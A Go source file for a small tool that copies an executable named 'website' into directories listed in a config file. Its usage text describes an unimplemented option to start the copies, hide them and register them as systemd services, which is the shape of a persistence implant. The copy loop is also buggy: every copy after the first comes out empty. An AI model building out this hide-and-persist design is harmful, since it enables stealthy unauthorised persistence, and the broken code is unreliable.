package main

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

func readLineFromFile(filePath string, lineNumber int) ([]string, error) {
	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	// Create a scanner to read the file line by line
	scanner := bufio.NewScanner(file)

	// Initialize variables
	var currentLine string
	var currentLineNumber int

	// Iterate through the lines until the specified line number
	for scanner.Scan() {
		currentLineNumber++
		if currentLineNumber == lineNumber {
			currentLine = scanner.Text()
			break
		}
	}

	// Check if the specified line number exists in the file
	if currentLineNumber < lineNumber {
		return nil, fmt.Errorf("Line %d not found in file", lineNumber)
	}

	// Split the line into a list using a separator (assuming comma here, adjust as needed)
	list := strings.Split(currentLine, ",")

	return list, nil
}

func copyFileToDirectories(sourceFilePath string, directories []string) error {
	// Open the source file
	sourceFile, err := os.Open(sourceFilePath)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	// Get the file info for the source file
	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	// Iterate through the list of directories
	for _, dir := range directories {
		// Construct the destination file path by joining the directory and the source file name
		destFilePath := filepath.Join(dir, sourceFileInfo.Name())

		// Create the destination file
		destFile, err := os.Create(destFilePath)
		if err != nil {
			return err
		}
		defer destFile.Close()

		// Copy the contents of the source file to the destination file
		_, err = io.Copy(destFile, sourceFile)
		if err != nil {
			return err
		}

		fmt.Printf("File copied to: %s\n", destFilePath)
	}

	return nil
}

func linuxDistrobution() {
	config_file := "linux_config.txt"
	executableName := "website"

	directoryLineNumber := 2

	// Create the list varibles
	directoryList, err := readLineFromFile(config_file, directoryLineNumber)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	// Copy the Exe File to directories
	err = copyFileToDirectories(executableName, directoryList)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
}

func main() {

	if len(os.Args) < 2 {
		fmt.Println("Usage: <name> <option>")
		fmt.Println("Linux: ")
		fmt.Println("  LinuxDistribute > Distrubute the exe across the directories named in linux_config.txt")
		fmt.Println("  LinuxStart > Starts the exe, hides them, and creates systemd process for the exe")
		return
	}

	// Current Path to executable
	executablePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	// Current name of executable
	executableName := filepath.Base(executablePath)

	// option varible
	option := os.Args[1]

	// Switch Cases
	switch option {
	case "LinuxDistribute":
		fmt.Println("Running Distrubution on Linux")
		linuxDistrobution()
	case "LinuxStart":
		fmt.Println("Starting Bigger Websites V2 on Linux")
	case "option2":
		fmt.Println(executableName)
	default:
		fmt.Println("Invalid option. Supported options: option1, option2")
	}
}
